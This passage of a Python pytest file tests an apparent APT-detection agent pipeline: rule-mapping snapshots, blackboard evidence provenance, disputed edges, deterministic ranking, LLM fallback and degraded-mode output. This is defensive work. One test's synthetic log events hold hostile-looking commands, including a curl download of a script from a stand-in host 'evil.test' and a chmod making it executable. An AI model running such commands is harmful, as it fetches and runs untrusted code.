            encoding="utf-8"
        )
    )
    valid_map_yaml = (
        e2e_fixtures_dir / "rules" / "mappings" / "valid_zircolite_mapping.yaml"
    ).read_text(encoding="utf-8")
    invalid_map_yaml = (
        e2e_fixtures_dir / "rules" / "mappings" / "invalid_mapping_missing_ts.yaml"
    ).read_text(encoding="utf-8")

    res_valid = validate_candidate(ctx_v1, "mapping", valid_map_yaml, mapping_samples)
    assert _field(res_valid, "passed") is True

    res_invalid = validate_candidate(ctx_v1, "mapping", invalid_map_yaml, mapping_samples)
    assert _field(res_invalid, "passed") is False
    assert len(_field(res_invalid, "diagnostics", default=[])) >= 1

    snap_v2 = reg.publish_snapshot(
        "mapping",
        "v2",
        {"zircolite_config.yaml": valid_map_yaml},
        {"validated": True},
    )
    assert _field(snap_v2, "version") == "v2"

    with pytest.raises(Exception):
        reg.publish_snapshot(
            "mapping",
            "v1",
            {"zircolite_config.yaml": "tampered: true\n"},
            {"author": "tamper"},
        )

    assert ctx_v1.mapping_version == "v1"
    loaded_v1 = reg.get_snapshot("mapping", ctx_v1.mapping_version)
    loaded_v2 = reg.get_snapshot("mapping", "v2")
    assert _field(loaded_v1, "artifacts") == _field(snap_v1, "artifacts")
    assert _field(loaded_v2, "artifacts") != _field(loaded_v1, "artifacts")


# ---------------------------------------------------------------------------
# T3-12: F08 x F09
# ---------------------------------------------------------------------------
def test_t3_12_f08_f09_blackboard_enforces_task_query_provenance_and_kb_rejection(
    tmp_path: Path,
    e2e_fixtures_dir: Path,
    load_scene_records,
    make_app_config,
    make_run_context,
) -> None:
    from apt_agent.blackboard import Blackboard
    from apt_agent.exceptions import ConflictError
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.models import Finding, Locator, Submission
    from apt_agent.tools import ToolRegistry

    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    index, records = load_scene_records(scene_dir)
    locator_map = {pid: Locator(**meta) for pid, meta in index.items()}

    cfg = make_app_config(base_dir=tmp_path)
    ctx = make_run_context(
        case_id="case-t3-12",
        run_id="run-t3-12",
        config=cfg,
        valid_physical_ids=set(index.keys()),
        locator_map=locator_map,
    )
    store = ingest_records(
        iter(records),
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        locator_map=locator_map,
    )
    norm = Normalizer().normalize_batch(ctx, store)
    assert len(norm.events) >= 2

    registry = ToolRegistry(
        ctx, store, norm.events, _make_rag_service(cfg), workspace_root=tmp_path
    )
    bb = Blackboard(
        ctx,
        valid_event_ids={ev.event_id for ev in norm.events},
        valid_physical_ids=set(index.keys()),
    )

    q_res = registry.invoke(
        "host",
        "query_events",
        {"filters": {}, "limit": 1},
        case_id=ctx.case_id,
        task_id="task-host-1",
    )
    assert _field(q_res, "ok") is True
    q_data = _field(q_res, "data", default=q_res)
    queried_ev = _field(q_data, "events", default=[])[0]
    queried_eid = _field(queried_ev, "event_id")
    q_id = _field(q_data, "query_id")
    unqueried_eid = next(ev.event_id for ev in norm.events if ev.event_id != queried_eid)

    bb.record_task_query("task-host-1", q_id, {queried_eid})

    sub = Submission(
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        task_id="task-host-1",
        submission_id="sub-1",
        query_ids=[q_id],
        findings=[
            Finding(
                claim="Observed process creation and spoofed refs",
                status="observed",
                evidence_event_ids=[
                    queried_eid,
                    unqueried_eid,
                    "kb-playbook-e41-pivot",
                ],
                knowledge_refs=[],
                tactic_ids=["TA0002"],
            )
        ],
        edges=[],
    )
    receipt = bb.submit_findings(ctx, sub)
    assert queried_eid in receipt.accepted_event_ids
    rejected_refs_set = {
        _field(r, "ref") if not isinstance(r, str) else r
        for r in receipt.rejected_refs
    }
    assert unqueried_eid in rejected_refs_set
    assert "kb-playbook-e41-pivot" in rejected_refs_set

    retry_receipt = bb.submit_findings(ctx, sub)
    assert retry_receipt.state_version == receipt.state_version
    assert retry_receipt.accepted_event_ids == receipt.accepted_event_ids

    conflicting_sub = Submission(
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        task_id="task-host-1",
        submission_id="sub-1",
        query_ids=[q_id],
        findings=[
            Finding(
                claim="Conflicting payload reusing same submission_id",
                status="observed",
                evidence_event_ids=[queried_eid],
                knowledge_refs=[],
                tactic_ids=["TA0011"],
            )
        ],
        edges=[],
    )
    try:
        conflict_receipt = bb.submit_findings(ctx, conflicting_sub)
    except ConflictError:
        conflict_receipt = None

    if conflict_receipt is not None:
        assert (
            conflict_receipt.state_version == receipt.state_version
            or len(conflict_receipt.rejected_refs) > 0
        )


# ---------------------------------------------------------------------------
# T3-13: F09 x F10
# ---------------------------------------------------------------------------
def test_t3_13_f09_f10_disputed_coexistence_and_deterministic_ranker_tie_break(
    e2e_fixtures_dir: Path,
    load_scene_records,
    make_run_context,
) -> None:
    from apt_agent.blackboard import Blackboard, rank, verify
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.models import Edge, Finding, KnowledgeRef, Locator, Submission

    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    index, records = load_scene_records(scene_dir)
    locator_map = {pid: Locator(**meta) for pid, meta in index.items()}

    ctx = make_run_context(
        case_id="case-t3-13",
        run_id="run-t3-13",
        valid_physical_ids=set(index.keys()),
        locator_map=locator_map,
    )
    store = ingest_records(
        iter(records),
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        locator_map=locator_map,
    )
    norm = Normalizer().normalize_batch(ctx, store)
    assert len(norm.events) >= 5
    by_pid = {
        (getattr(ev, "physical_record_id", None) or getattr(ev, "raw_id", None)): ev
        for ev in norm.events
    }
    ev_0 = by_pid["pr-s01-0001"]  # 10:00:00.123Z ProcessGuid G7
    ev_1 = by_pid["pr-s01-0002"]  # 10:00:03Z     ProcessGuid G7
    ev_2 = by_pid["pr-s01-0004"]  # 10:00:02.500Z Zeek DNS
    ev_3 = by_pid["pr-s01-0005"]  # 10:00:03.600Z Zeek HTTP 203.0.113.8
    ev_4 = by_pid["pr-s01-0003"]  # 10:00:03Z     Zeek Conn 203.0.113.8

    bb = Blackboard(
        ctx,
        valid_event_ids={ev.event_id for ev in norm.events},
        valid_physical_ids=set(index.keys()),
    )
    bb.record_task_query("task-a", "q-a", {ev_0.event_id, ev_1.event_id, ev_4.event_id})
    bb.record_task_query("task-b", "q-b", {ev_2.event_id, ev_3.event_id})
    bb.record_task_query("task-chal", "q-c", {ev_1.event_id, ev_4.event_id})

    extra_krefs = [
        KnowledgeRef(
            retrieval_id=f"ret-{i}",
            doc_id="doc-playbook-proc-net",
            chunk_id="kb-playbook-e41-pivot",
            version="1.0",
            locator="synthetic_kb.jsonl:3",
            excerpt="Pivot playbook",
            match_reason="keyword",
        )
        for i in range(4)
    ]

    bb.submit_findings(
        ctx,
        Submission(
            case_id=ctx.case_id,
            run_id=ctx.run_id,
            task_id="task-a",
            submission_id="sub-alpha",
            query_ids=["q-a"],
            findings=[
                Finding(
                    claim="Chain alpha observed",
                    status="observed",
                    evidence_event_ids=[ev_0.event_id, ev_1.event_id],
                    knowledge_refs=[],
                    tactic_ids=["TA0002"],
                )
            ],
            edges=[
                Edge(
                    from_event_id=ev_0.event_id,
                    to_event_id=ev_1.event_id,
                    relation="process_spawn",
                    join_keys={"ProcessGuid": "G7"},
                    evidence_event_ids=[ev_0.event_id, ev_1.event_id],
                    status="verified",
                )
            ],
        ),
    )

    bb.submit_findings(
        ctx,
        Submission(
            case_id=ctx.case_id,
            run_id=ctx.run_id,
            task_id="task-b",
            submission_id="sub-beta",
            query_ids=["q-b"],
            findings=[
                Finding(
                    claim="Chain beta observed with extra citations",
                    status="observed",
                    evidence_event_ids=[ev_2.event_id, ev_3.event_id],
                    knowledge_refs=extra_krefs,
                    tactic_ids=["TA0011"],
                )
            ],
            edges=[
                Edge(
                    from_event_id=ev_2.event_id,
                    to_event_id=ev_3.event_id,
                    relation="network_flow",
                    join_keys={"DestinationIp": "203.0.113.8"},
                    evidence_event_ids=[ev_2.event_id, ev_3.event_id],
                    status="verified",
                )
            ],
        ),
    )

    # Disputed edge submitted with competing positions
    bb.submit_findings(
        ctx,
        Submission(
            case_id=ctx.case_id,
            run_id=ctx.run_id,
            task_id="task-a",
            submission_id="sub-egress-pro",
            query_ids=["q-a"],
            findings=[
                Finding(
                    claim="Egress matches C2",
                    status="observed",
                    evidence_event_ids=[ev_1.event_id, ev_4.event_id],
                    knowledge_refs=[],
                    tactic_ids=["TA0011"],
                )
            ],
            edges=[
                Edge(
                    from_event_id=ev_1.event_id,
                    to_event_id=ev_4.event_id,
                    relation="egress_match",
                    join_keys={"DestinationIp": "203.0.113.8"},
                    evidence_event_ids=[ev_1.event_id, ev_4.event_id],
                    status="proposed",
                )
            ],
        ),
    )
    bb.submit_findings(
        ctx,
        Submission(
            case_id=ctx.case_id,
            run_id=ctx.run_id,
            task_id="task-chal",
            submission_id="sub-egress-dispute",
            query_ids=["q-c"],
            findings=[
                Finding(
                    claim="NAT ambiguity disputes direct egress attribution",
                    status="disputed",
                    evidence_event_ids=[ev_1.event_id, ev_4.event_id],
                    knowledge_refs=[],
                    tactic_ids=["TA0011"],
                )
            ],
            edges=[
                Edge(
                    from_event_id=ev_1.event_id,
                    to_event_id=ev_4.event_id,
                    relation="egress_match",
                    join_keys={"DestinationIp": "203.0.113.8"},
                    evidence_event_ids=[ev_1.event_id, ev_4.event_id],
                    status="disputed",
                )
            ],
        ),
    )

    ver = verify(ctx, bb)
    verified_state = _unwrap_verified_state(ver)
    res1 = rank(ctx, verified_state, store, hits=[], coverage=[])
    res2 = rank(ctx, verified_state, store, hits=[], coverage=[])

    assert res1.model_dump() == res2.model_dump()

    # Disputed items retained separately and NOT promoted to confirmed chains
    disputed_blob = json.dumps(
        getattr(res1, "unresolved", getattr(res1, "disputed", [])),
        default=str,
    )
    assert "egress_match" in disputed_blob or ev_4.event_id in disputed_blob

    chains = getattr(res1, "chains", [])
    assert len(chains) >= 2
    chain_ids = [
        (c["chain_id"] if isinstance(c, dict) else c.chain_id) for c in chains
    ]
    assert chain_ids == sorted(chain_ids)


# ---------------------------------------------------------------------------
# T3-14: F07 x F12
# ---------------------------------------------------------------------------
def test_t3_14_f07_f12_multi_agent_graph_budget_reserve_and_llm_fallback(
    tmp_path: Path,
    e2e_fixtures_dir: Path,
    load_scene_records,
    make_app_config,
    make_run_context,
) -> None:
    from apt_agent.blackboard import Blackboard, rank, verify
    from apt_agent.detection import DetectionCoordinator
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.models import Finding, Locator, Submission
    from apt_agent.pipeline import analyze_records, to_prediction
    from apt_agent.tools import ToolRegistry

    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    index, records = load_scene_records(scene_dir)
    locator_map = {pid: Locator(**meta) for pid, meta in index.items()}

    cfg = make_app_config(
        base_dir=tmp_path,
        llm_enabled=False,
        budget_overrides={
            "max_rounds": 2,
            "max_tasks_per_round": 1,
            "max_tokens": 500,
            "reserve_ratio": 0.8,
        },
    )
    ctx = make_run_context(
        case_id="case-t3-14",
        run_id="run-t3-14",
        config=cfg,
        valid_physical_ids=set(index.keys()),
        locator_map=locator_map,
    )
    store = ingest_records(
        iter(records),
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        locator_map=locator_map,
    )
    norm = Normalizer().normalize_batch(ctx, store)
    det = DetectionCoordinator(cfg).detect(ctx, norm.events)
    rag = _make_rag_service(cfg)
    registry = ToolRegistry(ctx, store, norm.events, rag, workspace_root=tmp_path)
    bb = Blackboard(
        ctx,
        valid_event_ids={ev.event_id for ev in norm.events},
        valid_physical_ids=set(index.keys()),
    )

    # 1. Offline deterministic fallback under tight 80% reserve budget
    pred_off = analyze_records(
        iter(records),
        config=cfg,
        valid_physical_ids=set(index.keys()),
        locator_map=locator_map,
    )
    _helpers.assert_valid_prediction(pred_off, valid_physical_ids=set(index.keys()))
    assert {"pr-s01-0001", "pr-s01-0002"} <= set(pred_off["physical_id_set"])

    # 2. Unreachable LLM endpoint falls back gracefully under the same tight budget
    cfg_unreachable = make_app_config(
        base_dir=tmp_path / "llm_unreachable",
        llm_enabled=True,
        overrides={
            "llm": {
                "base_url": "http://127.0.0.1:1/v1",
                "api_key": "offline-dummy",
                "timeout_s": 0.2,
            }
        },
        budget_overrides={
            "max_rounds": 2,
            "max_tasks_per_round": 1,
            "max_tokens": 500,
            "reserve_ratio": 0.8,
        },
    )
    pred_llm_fb = analyze_records(
        iter(records),
        config=cfg_unreachable,
        valid_physical_ids=set(index.keys()),
        locator_map=locator_map,
    )
    _helpers.assert_valid_prediction(pred_llm_fb, valid_physical_ids=set(index.keys()))
    assert {"pr-s01-0001", "pr-s01-0002"} <= set(pred_llm_fb["physical_id_set"])

    # 3. Verify + Rank remain operational under reserved budget (populated Blackboard)
    ev_e41 = next(
        ev
        for ev in norm.events
        if (getattr(ev, "physical_record_id", None) or getattr(ev, "raw_id", None))
        == "pr-s01-0001"
    )
    q_res = registry.invoke(
        "host",
        "query_events",
        {"filters": {}, "limit": 20},
        case_id=ctx.case_id,
        task_id="task-reserve-1",
    )
    assert _field(q_res, "ok") is True
    q_data = _field(q_res, "data", default=q_res)
    q_events = _field(q_data, "events", default=[])
    q_eids = {_field(e, "event_id") for e in q_events}
    assert ev_e41.event_id in q_eids
    q_id = _field(q_data, "query_id")
    bb.record_task_query("task-reserve-1", q_id, q_eids)
    bb.submit_findings(
        ctx,
        Submission(
            case_id=ctx.case_id,
            run_id=ctx.run_id,
            task_id="task-reserve-1",
            submission_id="sub-reserve-1",
            query_ids=[q_id],
            findings=[
                Finding(
                    claim="Verified E41 under reserved budget",
                    status="observed",
                    evidence_event_ids=[ev_e41.event_id],
                    knowledge_refs=[],
                    tactic_ids=["TA0002"],
                )
            ],
            edges=[],
        ),
    )
    ver = verify(ctx, bb)
    verified_state = _unwrap_verified_state(ver)
    ranked = rank(
        ctx,
        verified_state,
        store,
        hits=det["hits"],
        coverage=det["coverage"],
    )
    assert ranked is not None
    assert len(_field(ranked, "coverage", default=[])) > 0
    assert ev_e41.event_id in _field(ranked, "attack_event_ids", default=[])
    pred_ranked = to_prediction(ctx, ranked, valid_physical_ids=set(index.keys()))
    _helpers.assert_valid_prediction(pred_ranked, valid_physical_ids=set(index.keys()))
    assert "pr-s01-0001" in pred_ranked["physical_id_set"]


# ---------------------------------------------------------------------------
# T3-15: F10 x F11
# ---------------------------------------------------------------------------
def test_t3_15_f10_f11_ranker_sibling_dedup_feeds_prediction_contract(
    e2e_fixtures_dir: Path,
    load_scene_records,
    make_run_context,
) -> None:
    from apt_agent.blackboard import Blackboard, rank, verify
    from apt_agent.ingestion import ingest_records
    from apt_agent.models import Event, Finding, Hit, Locator, Submission
    from apt_agent.pipeline import to_prediction

    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_05_full_16_types"
    index, records = load_scene_records(scene_dir)
    locator_map = {pid: Locator(**meta) for pid, meta in index.items()}

    ctx = make_run_context(
        case_id="case-t3-15",
        run_id="run-t3-15",
        valid_physical_ids=set(index.keys()),
        locator_map=locator_map,
    )
    store = ingest_records(
        iter(records),
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        locator_map=locator_map,
    )

    # pr-ta2-1 maps to two sibling events (ev-1a, ev-1b); pr-ta2-2..4 map to 1 each
    events = [
        Event(
            event_id="ev-1a",
            physical_record_id="pr-ta2-1",
            source_type="windows_sysmon",
            event_time="2024-05-30T10:00:00Z",
            fields={"Image": "powershell.exe"},
        ),
        Event(
            event_id="ev-1b",
            physical_record_id="pr-ta2-1",
            source_type="windows_sysmon",
            event_time="2024-05-30T10:00:01Z",
            fields={"CommandLine": "powershell.exe -Enc A"},
        ),
        Event(
            event_id="ev-2",
            physical_record_id="pr-ta2-2",
            source_type="ecar",
            event_time="2024-05-30T10:00:02Z",
            fields={"Image": "powershell.exe"},
        ),
        Event(
            event_id="ev-3",
            physical_record_id="pr-ta2-3",
            source_type="bash_history",
            event_time="2024-05-30T10:00:03Z",
            fields={"CommandLine": "curl http://evil.test/s.sh"},
        ),
        Event(
            event_id="ev-4",
            physical_record_id="pr-ta2-4",
            source_type="bash_history",
            event_time="2024-05-30T10:00:04Z",
            fields={"CommandLine": "chmod +x /tmp/s.sh"},
        ),
    ]

    bb = Blackboard(
        ctx,
        valid_event_ids={ev.event_id for ev in events},
        valid_physical_ids=set(index.keys()),
    )
    bb.record_task_query("task-ta2", "q-ta2", {ev.event_id for ev in events})
    bb.submit_findings(
        ctx,
        Submission(
            case_id=ctx.case_id,
            run_id=ctx.run_id,
            task_id="task-ta2",
            submission_id="sub-ta2",
            query_ids=["q-ta2"],
            findings=[
                Finding(
                    claim="Sibling TA0002 events observed",
                    status="observed",
                    evidence_event_ids=[ev.event_id for ev in events],
                    knowledge_refs=[],
                    tactic_ids=["TA0002"],
                )
            ],
            edges=[],
        ),
    )

    hits = [
        Hit(
            hit_id=f"hit-{ev.event_id}",
            rule_id="11111111-2222-3333-4444-555555555501",
            rule_version="v1",
            engine="zircolite",
            engine_version="4.8.0",
            event_ids=[ev.event_id],
            tactic_ids=["TA0002"],
        )
        for ev in events
    ]

    ver = verify(ctx, bb)
    case_result = rank(ctx, _unwrap_verified_state(ver), store, hits=hits, coverage=[])
    pred = to_prediction(ctx, case_result, valid_physical_ids=set(index.keys()))

    _helpers.assert_valid_prediction(pred, valid_physical_ids=set(index.keys()))
    ta2_list = pred["ta_physical_ids"]["TA0002"]
    assert len(ta2_list) == 3
    assert ta2_list.count("pr-ta2-1") <= 1
    assert {"pr-ta2-1", "pr-ta2-2", "pr-ta2-3", "pr-ta2-4"} <= set(pred["physical_id_set"])


# ---------------------------------------------------------------------------
# T3-16: F07 x F11 & F11 x F12
# ---------------------------------------------------------------------------
def test_t3_16_f07_f11_f12_analyze_records_degraded_graph_export_under_faults(
    tmp_path: Path,
    e2e_fixtures_dir: Path,
    load_scene_records,
    make_app_config,
) -> None:
    from apt_agent.models import Locator
    from apt_agent.pipeline import analyze_records

    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_07_degraded"
    index, records = load_scene_records(scene_dir)
    locator_map = {pid: Locator(**meta) for pid, meta in index.items()}

    cfg = make_app_config(
        base_dir=tmp_path,
        engine_modes={"hayabusa": "crash"},
        knowledge_path=e2e_fixtures_dir / "kb" / "corrupt_kb.jsonl",
        rag_timeout_ms=100,
        llm_enabled=False,
        budget_overrides={"max_rounds": 1, "reserve_ratio": 0.8},
    )

    rag_bad = _make_rag_service(cfg)
    rag_out = rag_bad.search_knowledge("WINWORD powershell", role="lead", top_k=5)
    assert _field(rag_out, "refs", default=[]) == []
    assert _field(rag_out, "evidence_ids", default=[]) == []
    assert (
        _field(rag_out, "degraded") is True
        or bool(_field(rag_out, "error"))
        or bool(_field(rag_out, "warnings"))
    )

    gen = (rec for rec in records)
    pred = analyze_records(
        gen,
        config=cfg,
        valid_physical_ids=set(index.keys()),
        locator_map=locator_map,
    )
    assert list(gen) == []

    _helpers.assert_valid_prediction(pred, valid_physical_ids=set(index.keys()))
    assert set(pred.keys()) == {"physical_id_set", "ta_physical_ids"}
    for forbidden in ("error", "stop_reason", "coverage"):
        assert forbidden not in pred
    assert set(pred["physical_id_set"]) <= set(index.keys())
    assert {"pr-s07-0001", "pr-s07-0002"} <= set(pred["physical_id_set"])
